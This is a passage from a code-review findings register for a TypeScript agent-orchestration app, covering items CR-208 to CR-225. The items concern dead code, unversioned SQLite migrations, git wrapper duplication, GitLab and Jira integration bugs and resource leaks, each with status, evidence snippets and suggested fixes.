- **Re-verification note:** The unused `renderAgentPrompt` import in the HTTP node is gone. Still open: `startContractZod` is exported but never imported (and still ignores `required`), `extractOutput(cfg, …)` still exists only to `void cfg`, `parentPlanMarkdown` is `async` with no await, `renderVersions` is still "dead code kept reachable", and the base `triggerInput(ctx)` has an unused parameter. Fix: delete or underscore them as the original suggests.

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 3 — Engine nodes
- **Source:** NODE-40
- **Location:** `lib/engine/nodes/start/contract.ts:88-102`, `lib/engine/nodes/http/http-node.ts:8`, `lib/engine/nodes/script/script-node.ts:202,210`, `lib/engine/nodes/build/step-build-node.ts:248`, `lib/engine/nodes/plan/plan-node.ts:744`, `lib/engine/nodes/base/node-definition.ts:148,176`
- **Problem:**
  - `startContractZod` is never imported anywhere, and it also ignores `required` (every field is mandatory).
  - The `renderAgentPrompt` import in http is unused.
  - `extractOutput(cfg, …)` exists only to `void cfg`.
  - `parentPlanMarkdown` is `async` with no await.
  - `renderVersions` is labelled "dead code kept reachable".
  - The base `triggerInput(ctx)` and `chat(ctx, …)` have unused parameters.
- **Evidence:**
  ```ts
  export function startContractZod(fields: StartContractField[]) { ... shape[f.key] = inner; }  // no .optional()
  void cfg;
  ```
- **Suggested fix:** Delete `startContractZod` and the unused import. Drop the `cfg` parameter. Make `parentPlanMarkdown` synchronous. Prefix intentionally unused parameters with `_`.
- **Effort:** S

### CR-208 [Low] `merge-request-service.ts` mixes several exports, duplicates its own helper, and isn't a node

- **Status at `abaa007`:** **Open**, fix in [Task 49](review-tasks/49-node-kind-structure.md)
- **Current location:** lib/engine/nodes/kinds/merge-request/merge-request-service.ts:13-49,76-82; lib/engine/nodes/chains/sdlc-chain.ts:30-34,98
- **Re-verification note:** One file still holds `CommitError`, `isCommitError`, `HOOK_PATTERNS`, `isHookRejection` and `MergeRequestService`. `create()` still inlines `HOOK_PATTERNS.some(...)` instead of calling `isHookRejection`. `MrCreationFailed` is still built from any error message. The services still live in the `nodes/` tree (now `nodes/kinds/merge-request` and `nodes/chains`). Fix: move the errors to `merge-request/errors.ts`, call `isHookRejection`, and consider relocating these orchestration services out of `nodes/`.

- **Severity:** Low
- **Category:** Boundaries
- **Area:** Area 3 — Engine nodes
- **Source:** NODE-41
- **Location:** `lib/engine/nodes/merge-request/merge-request-service.ts:13-49,78`, `lib/engine/nodes/sdlc/chain.ts:27-32`
- **Problem:**
  - One file holds `CommitError`, `isCommitError`, `HOOK_PATTERNS`, `isHookRejection` and `MergeRequestService`, against §3.2's one-class-per-file.
  - `create()` re-implements `isHookRejection` inline (`HOOK_PATTERNS.some(...)`).
  - Neither `MergeRequestService` nor `SdlcChain` is a `NodeDefinition`; both are graph and engine orchestration living in the `nodes/` tree.
  - `MrCreationFailed` is constructed from any error message, so its "typed error" carries no information.
- **Evidence:**
  ```ts
  if (HOOK_PATTERNS.some((p) => p.test(msg))) {   // isHookRejection(msg) exists 30 lines above
  ```
- **Suggested fix:** Move the errors to `merge-request/errors.ts` and call `isHookRejection`. Consider moving `merge-request/` and `sdlc/` to `lib/engine/chain/`, a follow-up for the engine-area owner.
- **Effort:** S

### CR-209 [Low] Resolve marks comments resolved unconditionally and hides git-host failures

- **Status at `abaa007`:** **Fixed** (Task 22 — resolve on host only after successful `resolveComment`; skip when `codeChanged` is false)
- **Current location:** lib/engine/nodes/kinds/resolve/resolve-node.ts; lib/engine/nodes/kinds/resolve/resolve-comments.ts

- **Severity:** Low
- **Category:** Correctness
- **Area:** Area 3 — Engine nodes
- **Source:** NODE-42
- **Location:** `lib/engine/nodes/resolve/resolve-node.ts:139-149`
- **Problem:** Every open comment is marked `resolved` (`resolved_by='agent'`) whatever the agent actually did, even when `codeChanged === false`. `resolveComment` failures are swallowed with `.catch(() => {})`. The local DB then says resolved while the MR thread stays open, and the poller won't re-surface those comments.
- **Evidence:**
  ```ts
  .resolveComment(ctx.flow.repo_url ?? "", mrIid, c.discussion_id, true)
  .catch(() => {});
  db.run(`UPDATE comments SET status='resolved', resolved_by='agent' ...`, db.now(), c.id);
  ```
- **Suggested fix:** Only mark a comment resolved after the host call succeeds (otherwise leave it `open` and emit a warning). Consider using the existing `resolving` status while the run is in flight.
- **Effort:** S

### CR-210 [Low] `schema.sql` is not the canonical schema; migrations are unversioned and re-run every boot

- **Status at `abaa007`:** **Open**, fix in [Task 08](review-tasks/08-db-bootstrap-and-schema.md)
- **Status:** **Fixed** (Task 08 — columns folded into `schema.sql`, `user_version` migration v1 seeds templates once per transaction)
- **Current location:** lib/db/schema.sql:20-37,39-52,133,151-161; lib/db/index.ts:73-259; scripts/init-prod-db.mjs:21; scripts/seed-custom-flow.mjs:38; scripts/seed-demo-flow.mjs:31
- **Re-verification note:** `schema.sql` is still not canonical. These columns exist only as `ALTER TABLE` in `migrate()`: `flows.execution_mode/repo_id/template_id/trigger_payload`, `nodes.session_id/prompt_override/label/config/join_mode`, and the `runs` model/token/cost columns. So the scripts that bootstrap from `schema.sql` alone produce a DB that does not match `rows.ts`. There is still no `user_version`, every probe and seed re-runs on each boot, and the stray "durable cursor-run handles" comment still sits above `branches`. Fix: fold all columns into `schema.sql` and gate steps on `PRAGMA user_version`. The legacy-data parts of this item should be deleted rather than versioned (see CR-211 and CR-212).

- **Severity:** Low
- **Category:** Boundaries
- **Area:** Area 4 — DB, git, integrations
- **Source:** DATA-30
- **Related:** CR-012 (ENG-07, DATA-29); CR-022 (DATA-02) — fix CR-022 first: versioned migrations should each run in a transaction; CR-116 (DATA-26); CR-158 (TOOL-05); CR-212 (DATA-32)
- **Location:** `lib/db/schema.sql:20-52`, `lib/db/schema.sql:150-160`, `lib/db/index.ts:85-163`, `lib/db/index.ts:228-241`
- **Problem:**
  - Many columns exist only as `ALTER TABLE` statements in `migrate()`: `flows.execution_mode/repo_id/template_id/trigger_payload`, `nodes.session_id/prompt_override/label/config/join_mode`, and `runs.model`/token/cost/usage columns.
  - Scripts that bootstrap from `schema.sql` alone (`scripts/init-prod-db.mjs:21`, `seed-custom-flow.mjs:38`) create a DB that differs from what `rows.ts` expects until the app boots.
  - With no `user_version`, every boot repeats all `PRAGMA table_info` probes, `UPDATE … LIKE` data fixes and seeding.
  - A stray comment ("durable cursor-run handles…", L132) sits above `branches` instead of `runs`.
- **Evidence:**
  ```ts
  if (!flowsCols.has("execution_mode")) {
    d.exec(`ALTER TABLE flows ADD COLUMN execution_mode TEXT NOT NULL DEFAULT 'cloud'`);
  }
  ```
- **Suggested fix:** Fold all columns into `schema.sql` for fresh DBs. Convert `migrate()` into an ordered list of `{ version, up }` steps gated by `PRAGMA user_version`, each in a transaction (see DATA-02 (CR-022)). Run legacy data fixes once.
- **Effort:** M

### CR-211 [Low] Legacy `flows` table rebuild drops constraints and would fail under enforced FKs

- **Status at `abaa007`:** **Obsolete (legacy, no fix)**, leftover code deleted in [Task 08](review-tasks/08-db-bootstrap-and-schema.md)
- **Status:** **Fixed** (Task 08 — `migrateTicketsToTasks` / flows rebuild deleted)

- **Severity:** Low
- **Category:** Correctness
- **Area:** Area 4 — DB, git, integrations
- **Source:** DATA-31
- **Related:** CR-021 (DATA-01); CR-022 (DATA-02) — fix CR-022 first: rebuild steps need the transactional migration runner; CR-114 (APP-12, DATA-23)
- **Location:** `lib/db/index.ts:459-477`
- **Problem:** The defensive rebuild reconstructs `flows` from `PRAGMA table_info` only. It loses the `REFERENCES` clauses on `parent_flow_id`, `repo_id` and `template_id`, and the `dflt_value` quoting is passed through raw. Unlike `migrateTaskColumnShape`, it does not disable `foreign_keys` before `DROP TABLE flows`. Since FKs are on and `nodes`, `artifacts` and others reference `flows`, the drop fails with a constraint error on any populated legacy DB, which then hits DATA-01 (CR-021).
- **Evidence:**
  ```ts
  d.exec(`INSERT INTO flows_new (${colNames}) SELECT ${colNames} FROM flows`);
  d.exec(`DROP TABLE flows`);
  d.exec(`ALTER TABLE flows_new RENAME TO flows`);
  ```
- **Suggested fix:** Rebuild `flows` from the canonical `schema.sql` definition, as `migrateTaskColumnShape` already does. Toggle `foreign_keys` OFF around the swap, run `PRAGMA foreign_key_check` afterwards, and wrap it in a transaction.
- **Effort:** S

### CR-212 [Low] Legacy normalizers do full-table scans plus per-row prepares on every boot

- **Status at `abaa007`:** **Obsolete (legacy, no fix)**, leftover code deleted in [Task 08](review-tasks/08-db-bootstrap-and-schema.md)
- **Status:** **Fixed** (Task 08 — `normalizeLegacy*` and per-boot data fixes deleted)
- **Re-verification note:** This concerns the legacy data normalizers, which are out of scope now that legacy flows are unsupported. The code still runs on every boot: `normalizeLegacyModelSpecs`/`FlowTriggers`/`Comments`/`McpSources` at `lib/db/index.ts:254-405` (comments still do a full scan plus a prepare inside the loop at 372), and the `gitlab_pipeline` remap and `template_id` backfill at 246-253. Delete them as part of the legacy-code cleanup.

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 4 — DB, git, integrations
- **Source:** DATA-32
- **Related:** CR-210 (DATA-30)
- **Location:** `lib/db/index.ts:320-358`, `lib/db/index.ts:229-236`, `lib/db/index.ts:369-388`
- **Problem:**
  - `normalizeLegacyComments` selects every comment row and `JSON.parse`s each one on every startup. It also calls `d.prepare(...)` inside the loop (L355).
  - The `REPLACE(... 'gitlab_pipeline' ...)` and `UPDATE flows SET template_id=...` statements run unconditionally on every boot.
  - `normalizeLegacyMcpSources` deletes any `mcp_sources: []` on every boot. That is fine only as long as no writer ever persists `[]` intentionally; the code comment asserts this, but nothing enforces it.

  Startup cost grows with history.
- **Evidence:**
  ```ts
  .prepare(`SELECT id, raw, discussion_id, author, body, status, created_at FROM comments`)
  ...
  d.prepare(`UPDATE comments SET author=?, raw=? WHERE id=?`)
    .run(normalized.author, JSON.stringify(normalized), c.id);
  ```
- **Suggested fix:** Gate one-shot data fixes behind `user_version` (DATA-30 (CR-210)). Hoist the prepared statement out of the loop and filter in SQL (`WHERE raw NOT LIKE '%"createdAt"%'`).
- **Effort:** S

### CR-213 [Low] `any` and non-null `!` in area code

- **Status at `abaa007`:** **Open**, fix in [Task 46](review-tasks/46-backend-types-cleanup.md)
- **Current location:** lib/db/index.ts:75,480-481,525,548,568,858,862,866,897,913,919,973,985; lib/git/local.ts:152,155,165; lib/integrations/gitlab/client.ts:75,317,319; lib/integrations/gitlab/git-host.ts:103,155,251; lib/integrations/jira/service.ts:88,90
- **Re-verification note:** The `get<T = any>`/`all<T = any>`/`run(...args: any[])`/`emitEvent(data?: any)`/`getSetting<T = any>`/`setSetting(value: any)` defaults remain. `upsertRepo` still returns `this.repoById(...)!`, and `parseWebhook` still treats the body as `any` with no Zod validation. Fix: default the generics to `unknown`, throw a typed `RepoNotFoundError`, add Zod schemas for the webhook payloads, and use `catch (e: unknown)`.

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 4 — DB, git, integrations
- **Source:** DATA-33
- **Related:** CR-003 (APP-03); CR-039 (NODE-44, TOOL-01) — fix CR-039 first: lint will report regressions once installed
- **Location:**
  - `lib/db/index.ts`: lines 75, 410, 452, 463-464, 508, 531, 551, 841, 845, 849, 868, 879, 895, 901, 955, 967
  - `lib/git/local.ts`: lines 140, 143, 153
  - `lib/integrations/gitlab/client.ts`: lines 75, 317, 319
  - `lib/integrations/gitlab/git-host.ts`: lines 103, 155, 251
  - `lib/integrations/jira/service.ts`: lines 88, 90
- **Problem:**
  - The `get<T = any>`, `all<T = any>`, `run(...args: any[])`, `emitEvent(data?: any)`, `getSetting<T = any>` and `setSetting(value: any)` defaults spread `any` through every consumer.
  - `upsertRepo` returns `this.repoById(id)!`. On an UPDATE with a stale id it returns `undefined` typed as `Repo`.
  - `parseWebhook` treats the whole body as `any`. It should be a Zod-validated boundary per AGENTS.md section 3.4.
- **Evidence:**
  ```ts
  get<T = any>(sql: string, ...args: any[]): T | undefined {
  ...
  return this.repoById(input.id)!;
  ```
- **Suggested fix:** Default generics to `unknown` and type the args as `unknown[]`. Have `upsertRepo` throw a typed `RepoNotFoundError` when `changes === 0`. Give `parseWebhook` Zod schemas for note and pipeline payloads. Use `catch (e: unknown)` with narrowing.
- **Effort:** M

### CR-214 [Low] Duplicated git exec wrappers, timeouts and helpers across three modules

- **Status:** Fixed (Task 33)
- **Current location:** lib/git/worktrees.ts:8-13,498-504,645-653; lib/git/local.ts:9-14,46-55,126-132,193; lib/integrations/local-agent/agent.ts:17,121-142; lib/integrations/gitlab/git-host.ts:19; lib/integrations/jira/service.ts:14
- **Re-verification note:** There are still three independent `execFile("git")` wrappers. `MAX_BUFFER` differs (10 MB in worktrees, 50 MB in local) and local-agent sets no default timeout. `headBranch` and `currentBranch` are identical, the base-ref fallback chain is duplicated (worktrees 450-463, local 193), and `maskToken` is duplicated in GitLab and Jira. Fix: add a shared `GitRunner` class with timeouts, redaction and typed errors injected into all three, and move `maskToken` to a shared util.

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 4 — DB, git, integrations
- **Source:** DATA-34
- **Related:** CR-023 (ENG-25, DATA-03); CR-100 (DATA-09); CR-101 (DATA-10)
- **Location:** `lib/git/worktrees.ts:8-13`, `lib/git/worktrees.ts:497-506`, `lib/git/worktrees.ts:645-653`, `lib/git/local.ts:10-15`, `lib/git/local.ts:42-50`, `lib/git/local.ts:119-127`, `lib/integrations/local-agent/agent.ts:17`, `lib/integrations/local-agent/agent.ts:121-142`, `lib/integrations/gitlab/git-host.ts:19-23`, `lib/integrations/jira/service.ts:14-18`
- **Problem:**
  - Three independent `execFile("git")` wrappers exist, with divergent `MAX_BUFFER` values (10 MB vs 50 MB) and timeout policies (none in local-agent).
  - `Worktrees.headBranch` and `LocalGit.currentBranch` are identical.
  - The base-ref fallback chain is implemented twice (`worktrees.ts:450-463`, `local.ts:180-187`).
  - `maskToken` is copy-pasted between GitLab and Jira.

  As a result, fixes like secret redaction (DATA-03 (CR-023)) or argument validation (DATA-09 (CR-100)) must be applied three times.
- **Evidence:**
  ```ts
  // worktrees.ts and local.ts, byte-identical
  const GIT_TIMEOUT_MS = 20_000;
  ...
  return execFileAsync("git", args, { maxBuffer: opts.maxBuffer ?? MAX_BUFFER, timeout: opts.timeout ?? GIT_TIMEOUT_MS });
  ```
- **Suggested fix:** Create `lib/git/git-runner.ts` (`class GitRunner { run(args, opts) }` with redaction, typed `GitCommandError` and default timeouts) and inject it into `Worktrees`, `LocalGit` and `LocalAgentService`. Move `maskToken` to a shared util.
- **Effort:** M

### CR-215 [Low] Module-level singletons created outside `processSingleton`, one with mutable state

- **Status:** Fixed (Task 33)
- **Current location:** lib/git/worktrees.ts:246,656-657; lib/git/local.ts:236; lib/git/dep-policy.ts:255; lib/git/worktree-setup.ts:294,562; lib/integrations/gitlab/client.ts:325; lib/integrations/jira/service.ts:97; lib/integrations/cursor/client.ts:120; lib/db/rows.ts:433
- **Re-verification note:** These are still plain module-level `new X()` singletons outside `processSingleton`. `worktrees` holds the mutable `inflight` Map, so the "one scan per repo" coalescing splits across `next dev` module graphs, and the comment still calls it "stateless enough". Fix: wrap them with `processSingleton(...)` and correct the comment.

- **Severity:** Low
- **Category:** Boundaries
- **Area:** Area 4 — DB, git, integrations
- **Source:** DATA-35
- **Related:** CR-059 (ENG-14); CR-175 (APP-28)
- **Location:** `lib/git/worktrees.ts:245`, `lib/git/worktrees.ts:657`, `lib/git/local.ts:224`, `lib/git/dep-policy.ts:255`, `lib/git/worktree-setup.ts:294`, `lib/git/worktree-setup.ts:562`, `lib/integrations/gitlab/client.ts:325`, `lib/integrations/jira/service.ts:97`, `lib/integrations/cursor/client.ts:120`, `lib/db/rows.ts:429`
- **Problem:** AGENTS.md section 3.3 requires dev singletons to go through `lib/singleton.ts`. `worktrees` holds a mutable `inflight` Map, and `singleton.ts` documents exactly this failure mode: separate module graphs under `next dev` get separate instances. Its "one scan per repo" coalescing therefore silently breaks across route bundles. The others are stateless today but inconsistent with `db`, `cursorAgent` and `localAgent`.
- **Evidence:**
  ```ts
  /** Shared worktree mechanics (stateless enough that a module-scoped singleton is safe — same as localGit). */
  export const worktrees = new Worktrees();
  ```
- **Suggested fix:** Wrap them with `processSingleton("worktrees", () => new Worktrees())`, and do the same for the rest. Fix the misleading "stateless" comment.
- **Effort:** S

### CR-216 [Low] `cursor/credentials.ts` is a cohesive functional module that AGENTS.md section 3.5 says should be a class; setting key repeated

- **Status at `abaa007`:** **Open**, fix in [Task 50](review-tasks/50-small-module-cleanups.md)
- **Current location:** lib/integrations/cursor/credentials.ts:9-26; lib/integrations/local-agent/agent.ts:88-92; app/api/settings/route.ts:80-82,138-145
- **Re-verification note:** There are still four loose functions with `"cursor.api_key"` repeated four times, and `setCursorApiKey("")` duplicates `clearCursorApiKey()`. The `local_agent.*` setting keys are still repeated between the agent and the settings route. Fix: create a `CursorCredentials` class and add setting-key constants (for example `constants/settings.ts` or a module const).

- **Severity:** Low
- **Category:** Boundaries
- **Area:** Area 4 — DB, git, integrations
- **Source:** DATA-36
- **Related:** CR-186 (ENG-37)
- **Location:** `lib/integrations/cursor/credentials.ts:9-26`
- **Problem:** It has four related functions over one setting key, and the `"cursor.api_key"` literal is repeated three times. `setCursorApiKey("")` and `clearCursorApiKey()` are duplicates. The `local_agent.*` keys are likewise repeated between `local-agent/agent.ts:88-92` and `app/api/settings/route.ts:82,145`.
- **Evidence:**
  ```ts
  return db.getSetting<string>("cursor.api_key", "").trim();
  ...
  db.setSetting("cursor.api_key", key.trim());
  ...
  db.setSetting("cursor.api_key", "");
  ```
- **Suggested fix:** Create `class CursorCredentials { constructor(private readonly settings: SettingsStore) {} get(); isSet(); set(key); clear(); }` with a module `const` (or `constants/settings.ts`) for the setting keys.
- **Effort:** S

### CR-217 [Low] Domain magic strings in the DB layer (template ids, node keys, statuses)

- **Status at `abaa007`:** **Open**, fix in [Task 44](review-tasks/44-engine-stores-and-constants.md)
- **Current location:** lib/db/index.ts:253,607-677 (7× 'tpl_sdlc_loop', 'tpl_step_build' at 670-677); lib/db/index.ts:391; lib/db/rows.ts:37,84,157,173,216,233,252,399
- **Re-verification note:** The DB layer still hardcodes the template ids and node keys in SQL, even though `SDLC_TEMPLATE_ID` (templates/template-store.ts:44) and `STEP_BUILD_TEMPLATE_ID`/`NODE_KEYS` (engine/constants/node-keys.ts) now exist. Flow, branch, run, comment and step-merge statuses are still `z.string()` in `rows.ts` (only nodes use `z.enum(NODE_STATUSES)`). Fix: pass the existing constants as SQL parameters and add status `as const` maps used as `z.enum`.

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 4 — DB, git, integrations
- **Source:** DATA-37
- **Location:** `lib/db/index.ts:174-196`, `lib/db/index.ts:236`, `lib/db/index.ts:374`, `lib/db/index.ts:590-661`, `lib/db/schema.sql:24`, `lib/db/schema.sql:44`, `lib/db/schema.sql:63`, `lib/db/schema.sql:79`, `lib/db/schema.sql:157`, `lib/db/schema.sql:330`
- **Problem:** `'tpl_sdlc_loop'` appears about 8 times, and `'tpl_step_build'`, the node keys `'pipeline'`, `'pipeline_fix'`, `'plan'`, `'build'` and `'step_build'`, and the trigger types are raw literals. The status sets in `schema.sql` comments are not mirrored by constants (only `NODE_STATUSES` exists in `rows.ts`). Flow, branch, run, comment and step-merge statuses are typed as `z.string()`.
- **Evidence:**
  ```ts
  d.exec(`UPDATE flows SET template_id='tpl_sdlc_loop' WHERE template_id IS NULL`);
  ```
- **Suggested fix:** Add `as const` maps (`BUILTIN_TEMPLATE_ID`, `NODE_KEY`, `FLOW_STATUS`, `RUN_STATUS`, `STEP_MERGE_STATUS`) in a backend constants module. Use them in the SQL parameters and as `z.enum` in `rows.ts`.
- **Effort:** S

### CR-218 [Low] `listWorktrees` coalescing can serve a pre-mutation scan to callers that require a "fresh" listing

- **Status:** Fixed (Task 33)
- **Current location:** lib/git/worktrees.ts:253-266,320-331,549,611-614
- **Re-verification note:** `listWorktrees` still lets any caller join an in-flight scan. `preflightRemoval`'s "fresh strict re-list", the verify path and the branch-delete guard can therefore act on a scan that started before a concurrent add or remove. Fix: add a `{ fresh: true }` option that bypasses coalescing (or a per-repo generation counter) and use it on those paths.

- **Severity:** Low
- **Category:** Correctness
- **Area:** Area 4 — DB, git, integrations
- **Source:** DATA-38
- **Location:** `lib/git/worktrees.ts:253-266`, `lib/git/worktrees.ts:330-331`, `lib/git/worktrees.ts:549-550`, `lib/git/worktrees.ts:612-614`
- **Problem:** `preflightRemoval` documents a "fresh strict re-list", but it can join an in-flight scan that started before a concurrent `worktree add` or `remove` on the same repo. Removal can then judge registration and nesting against stale data, and `deleteBranchAfterRemoval`'s checked-out guard can be stale.
- **Evidence:**
  ```ts
  const existing = this.inflight.get(key);
  if (existing) return existing;
  ```
- **Suggested fix:** Add a `{ fresh: true }` option that bypasses the coalescing, and use it in preflight, verify and branch-delete. Alternatively, bump a per-repo generation counter on every mutation and only join scans from the current generation.
- **Effort:** S

### CR-219 [Low] SSH-style repo URLs are not supported by GitLab project-path parsing

- **Status at `abaa007`:** **Fixed** ([Task 31](review-tasks/31-git-host-clients.md))
- **Current location:** lib/integrations/gitlab/repo-url.ts; lib/schemas/repo.ts
- **Re-verification note:** The project-path parsing still uses `/^[a-z]+:\/\/[^/]+\/(.+)$/i`, so scp-style `git@host:group/repo.git` is URL-encoded whole and every API call 404s. `hostOf` returns null for it too. Fix: parse the `user@host:path` form (and `ssh://`) and validate repo URLs with Zod at registration.

- **Severity:** Low
- **Category:** Correctness
- **Area:** Area 4 — DB, git, integrations
- **Source:** DATA-39
- **Related:** CR-024 (DATA-04)
- **Location:** `lib/integrations/gitlab/client.ts:50-57`, `lib/integrations/gitlab/client.ts:233-244`
- **Problem:** With `git@gitlab.company.com:group/repo.git`, the scheme regex does not match, so the whole string is URL-encoded as the project path and every API call 404s. `hostOf` also returns null, so routing relies on the single-instance fallback (DATA-04 (CR-024)).
- **Evidence:**
  ```ts
  const m = u.match(/^[a-z]+:\/\/[^/]+\/(.+)$/i);
  return encodeURIComponent(m ? m[1] : u);
  ```
- **Suggested fix:** Parse the scp-like `user@host:path` form as well (and `ssh://`). Validate repo URLs with Zod when repos are registered.
- **Effort:** S

### CR-220 [Low] Jira credential test hardcodes the Cloud v3 API and Basic auth; multiple instances are silently ignored

- **Status at `abaa007`:** **Fixed** ([Task 31](review-tasks/31-git-host-clients.md) — single instance enforced; Cloud/DC auth probe in `testInstance`; runtime auth from `api-profile`)
- **Current location:** lib/integrations/jira/service.ts; lib/integrations/jira/api-profile.ts
- **Re-verification note:** `testInstance` still always calls `/rest/api/3/myself` with Basic `email:token`, so Data Center PATs (`/rest/api/2` with Bearer auth) likely fail; this still needs checking against a DC instance. `active()` still returns `listInstances()[0]`, silently ignoring any other instance. Fix: store a per-instance deployment/auth kind, and either reject a second instance or make the active instance explicit.

- **Severity:** Low
- **Category:** Correctness
- **Area:** Area 4 — DB, git, integrations
- **Source:** DATA-40
- **Status:** Needs verification
  - DATA-40: "Jira Data Center serves `/rest/api/2` and expects `Authorization: Bearer <PAT>`, so self-hosted tests likely always fail (needs verification against a DC instance)."
- **Location:** `lib/integrations/jira/service.ts:66-68`, `lib/integrations/jira/service.ts:76-93`
- **Problem:** The schema (`schema.sql:190-197`) advertises self-hosted PATs. However, `testInstance` always calls `/rest/api/3/myself` with `Basic email:token`. Jira Data Center serves `/rest/api/2` and expects `Authorization: Bearer <PAT>`, so self-hosted tests likely always fail (needs verification against a DC instance). `active()` picks the alphabetically-first `base_url`, so any additional registered instance is unused without notice.
- **Evidence:**
  ```ts
  `${baseUrl.replace(/\/+$/, "")}/rest/api/3/myself`,
  ...
  Authorization: `Basic ${Buffer.from(`${email}:${token}`).toString("base64")}`,
  ```
- **Suggested fix:** Store an `auth_kind` or `deployment` per instance (cloud or dc) and choose the API version and auth scheme from it. Either reject adding a second instance, or make the active instance explicit.
- **Effort:** M

### CR-221 [Low] `schema.sql` is loaded relative to `process.cwd()`

- **Status at `abaa007`:** **Open**, fix in [Task 08](review-tasks/08-db-bootstrap-and-schema.md)
- **Status:** **Fixed** (Task 08 — `config.db.schemaSqlPath()` resolves from repo root; `AppConfig.root` no longer follows `process.cwd()`)
- **Current location:** lib/db/index.ts:48-51
- **Re-verification note:** `schema.sql` is still read from `path.join(process.cwd(), "lib/db/schema.sql")`, so launching from any other directory throws ENOENT on first DB access. Fix: resolve the path via `config` or embed the schema as a TS string module.

- **Severity:** Low
- **Category:** Correctness
- **Area:** Area 4 — DB, git, integrations
- **Source:** DATA-41
- **Related:** CR-021 (DATA-01); CR-158 (TOOL-05)
- **Location:** `lib/db/index.ts:48-51`
- **Problem:** If `next start` or a script is launched from any directory other than the repo root (a process manager, the monorepo root), `readFileSync` throws ENOENT on first DB access. Combined with DATA-01 (CR-021), the connection is then cached unmigrated.
- **Evidence:**
  ```ts
  const schema = fs.readFileSync(
    path.join(process.cwd(), "lib/db/schema.sql"),
    "utf8"
  );
  ```
- **Suggested fix:** Resolve the path through `config` (e.g. `config.db.schemaPath()`), or embed the schema as a TS string module so it is bundled and traced.
- **Effort:** S

### CR-222 [Low] `lib/git/local.ts` depends on the engine layer

- **Status:** Fixed (Task 33)
- **Current location:** lib/git/local.ts:35-38,57-65; lib/engine/ports/git-host.ts:278-284
- **Re-verification note:** Fixed: the layering inversion. `lib/git/local.ts` no longer imports the engine, and callers pass an `AuthedUrlResolver`. Remaining: routing and credential errors are still swallowed twice (`authedCloneUrlFor` and `LocalGit.authedUrl` both catch and fall back to the raw repo URL), so a missing token silently becomes an unauthenticated push. Fix: let the resolver throw a typed error and surface it.

- **Severity:** Low
- **Category:** Boundaries
- **Area:** Area 4 — DB, git, integrations
- **Source:** DATA-42
- **Location:** `lib/git/local.ts:9`, `lib/git/local.ts:52-60`
- **Problem:** The git mechanics layer imports `gitHostRegistry` from `lib/engine/ports`, which inverts the dependency direction. `worktrees.ts` and `worktree-setup.ts` explicitly stay "pure, no engine imports". It also swallows routing errors and silently falls back to an unauthenticated URL.
- **Evidence:**
  ```ts
  import { gitHostRegistry } from "../engine/ports/git-host";
  ...
  return gitHostRegistry.forRepo(repoUrl).authedCloneUrl(repoUrl);
  ```
- **Suggested fix:** Inject a `CredentialProvider` interface (`authFor(repoUrl)`) into the `LocalGit` constructor. The engine wires it to the registry.
- **Effort:** S

### CR-223 [Low] In-process run handles leak if a started run is never streamed

- **Status:** Fixed (Task 32)
- **Status at `abaa007`:** **Open**, fix in [Task 32](review-tasks/32-agent-ports.md)
- **Current location:** lib/integrations/cursorSdk.ts:148-150,267,272-278,284-292; lib/engine/harness/agent-runner.ts:116-118
- **Re-verification note:** `createRun` still registers the handle, and only `streamRun`'s `finally` removes it and closes the agent. `cancelRun` doesn't release it, and any throw between `start()` and `port.stream` (for example `persistRun`) leaks the handle while `hasActiveRun` stays true. This is still unverified at runtime. Fix: release and close in `cancelRun`, and add a `release(runId)` for callers' `finally` (or a TTL sweep).

- **Severity:** Low
- **Category:** Correctness
- **Area:** Area 4 — DB, git, integrations
- **Source:** DATA-43
- **Status:** Needs verification
  - DATA-43: "Needs verification of how often that window throws."
- **Location:** `lib/integrations/cursorSdk.ts:91`, `lib/integrations/cursorSdk.ts:261-268`, `lib/integrations/cursorSdk.ts:286-292`
- **Problem:** `createRun` registers `{agent, run}` in `this.runs`, and only `streamRun`'s `finally` removes it and closes the agent. If anything between start and stream throws, for example `persistRun` or the `runs` lookup in `agent-runner.ts:116-118`, the handle and SDK agent leak for the process lifetime. `hasActiveRun` then reports true forever, which misleads reconcile. Needs verification of how often that window throws.
- **Evidence:**
  ```ts
  this.runs.set(run.id, started);
  return { agentId: agent.agentId, runId: run.id };
  ```
- **Suggested fix:** Have `cancelRun` also remove and close the handle. Add a `release(runId)` method that callers invoke in their own `finally`, or a TTL sweep for handles that are never streamed.
- **Effort:** S

### CR-224 [Low] Worktree base resolution silently falls back to the hub's current `HEAD`

- **Status:** Fixed (Task 33)
- **Current location:** lib/git/worktrees.ts:449-463
- **Re-verification note:** `resolveBaseRef` still ends its candidate chain with `"HEAD"`, so a missing default branch silently cuts the flow branch from whatever the hub has checked out. Fix: drop `HEAD` and throw a typed `BaseRefNotFoundError` naming the configured branch, or fetch `origin <base>` once first.

- **Severity:** Low
- **Category:** Correctness
- **Area:** Area 4 — DB, git, integrations
- **Source:** DATA-44
- **Location:** `lib/git/worktrees.ts:450-463`
- **Problem:** When `origin/<base>`, `<base>`, `origin/master` and `master` are all missing (e.g. the default branch is `develop` and was never fetched), the new flow branch is cut from whatever the developer currently has checked out in the hub, possibly an unrelated WIP branch. The MR then includes foreign commits, and nothing reports it beyond the base name in a lifecycle event.
- **Evidence:**
  ```ts
  "origin/master",
  "master",
  "HEAD",
  ];
  ```
- **Suggested fix:** Drop `HEAD` from the chain and throw a typed `BaseRefNotFoundError` that names the configured default branch. Alternatively, fetch `origin <base>` once before giving up.
- **Effort:** S

### CR-225 [Low] `getMRChanges` uses the deprecated `/changes` endpoint and ignores truncation

- **Status at `abaa007`:** **Fixed** ([Task 31](review-tasks/31-git-host-clients.md))
- **Current location:** lib/integrations/gitlab/client.ts (`getMRDiffs`); lib/engine/ports/git-host.ts (`ChangeRequestDiffs.truncated`)
- **Re-verification note:** This still uses the deprecated `/merge_requests/:iid/changes` endpoint and ignores `overflow`, so the AI review can silently review a truncated diff. Fix: switch to the paginated `/diffs` and surface a `truncated` flag on the port result.

- **Severity:** Low
- **Category:** Correctness
- **Area:** Area 4 — DB, git, integrations
- **Source:** DATA-45
- **Related:** CR-098 (DATA-06)
- **Location:** `lib/integrations/gitlab/client.ts:104-106`, `lib/integrations/gitlab/git-host.ts:102-110`
- **Problem:** `GET /merge_requests/:iid/changes` is deprecated, in favour of `/diffs`, which is paginated. For large MRs it returns `overflow: true` with diffs omitted. The adapter ignores `overflow`, so the AI review silently reviews a partial diff.
